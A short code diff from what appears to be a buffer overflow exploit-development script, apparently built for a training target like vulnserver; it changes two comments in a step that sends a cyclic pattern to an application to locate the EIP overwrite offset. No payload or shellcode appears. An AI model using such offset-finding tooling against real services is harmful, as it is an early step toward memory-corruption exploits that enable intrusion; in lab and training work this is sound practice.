@@ -35,7 +35,7 @@ def main():
         # Create pattern from crash bytes plus 300 byte padding
         pat = pattern.create_pattern(crash_bytes + 300)
 
-        # Reset vulnserver
+        # Reset application
         user_input.get_input("DEBUG: User reset debugger...")
 
         # Send pattern to application to identify EIP overwrite
@@ -46,6 +46,7 @@ def main():
 
         # Find position of EIP query in string
         # NOTE: Decodes EIP hex to ascii before passing
+        # Reverses result due to little endianness
         clear_text = bytearray.fromhex(eip_query).decode()[::-1]
         offset = pattern.find_offset(clear_text)
 
